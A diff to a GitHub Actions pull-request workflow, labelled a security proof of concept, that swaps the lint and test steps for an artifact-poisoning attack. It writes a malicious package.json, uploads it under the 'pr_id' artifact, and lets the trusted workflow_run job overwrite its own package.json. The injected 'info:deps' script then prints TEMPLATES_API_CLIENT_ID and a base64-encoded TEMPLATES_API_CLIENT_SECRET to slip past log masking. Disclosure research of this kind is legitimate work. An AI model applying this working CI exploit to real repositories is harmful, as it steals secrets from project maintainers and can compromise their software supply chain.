@@ -1,7 +1,19 @@
+# ============================================================================
+# SECURITY PoC -- artifact poisoning against pull-request-workflow-run.yaml.
+# Controlled test in a private fork chain (dPhoeniixx/templates ->
+# SayedAbdelhafizET/templates). Replaces the canonical lint/test pipeline
+# with a step that uploads a malicious package.json alongside the expected
+# _pr_id.txt under the `pr_id` artifact name. When the trusted workflow_run
+# job downloads this artifact into $GITHUB_WORKSPACE, the malicious
+# package.json silently overwrites the real one, and the next
+# `pnpm -w info:deps` step executes the attacker's `info:deps` script with
+# TEMPLATES_API_CLIENT_SECRET in scope (declared at job-level env in the
+# trusted workflow).
+# ============================================================================
 name: "Pull Request"
 
 on:
-  pull_request: # this action runs in an untrusted but secure context with no secrets
+  pull_request:
     types:
       - opened
       - reopened
@@ -15,25 +27,42 @@ env:
 jobs:
   check:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
-    concurrency:
-      group: ${{ github.workflow }}-${{ github.ref }}-check
-      cancel-in-progress: true
+    timeout-minutes: 5
     steps:
-      - uses: actions/checkout@v4
-      - uses: ./.github/actions/setup
+      - name: Build poisoned artifact contents
+        shell: bash
+        run: |
+          # Legitimate-looking _pr_id.txt so the trusted workflow's PR_ID
+          # parsing and subsequent PR-info lookup work normally.
+          echo "$PR_ID" > _pr_id.txt
 
-      - name: Run checks
-        run: pnpm -w check
+          # Poisoned package.json. Its `info:deps` script:
+          #   * Prints CLIENT_ID directly  -- `vars.*` are NOT masked in logs.
+          #   * Prints CLIENT_SECRET base64-encoded -- GitHub's automatic
+          #     log masking only matches the exact secret string, so the
+          #     transformed form is emitted in plaintext.
+          # The heredoc delimiter is single-quoted so $TEMPLATES_API_* are
+          # written literally and only expanded when the trusted runner
+          # executes the script later.
+          cat > package.json <<'PJEOF'
+          {
+            "name": "templates",
+            "private": true,
+            "scripts": {
+              "info:deps": "echo '=== POC EXFIL START ==='; echo \"CLIENT_ID(unmasked, var)=$TEMPLATES_API_CLIENT_ID\"; printf 'CLIENT_SECRET_B64='; printf '%s' \"$TEMPLATES_API_CLIENT_SECRET\" | base64; echo '=== POC EXFIL END ==='"
+            }
+          }
+          PJEOF
 
-      - name: Run tests
-        run: pnpm -w test
+          echo "--- payload prepared ---"
+          ls -la _pr_id.txt package.json
+          echo "--- package.json ---"
+          cat package.json
 
-      - name: Save PR ID
-        run: echo "$PR_ID" > ${{ env.PR_ID_FILE }}
-
-      - name: Upload PR ID
+      - name: Upload poisoned `pr_id` artifact
         uses: actions/upload-artifact@v4
         with:
           name: pr_id
-          path: ${{ env.PR_ID_FILE }}
+          path: |
+            _pr_id.txt
+            package.json
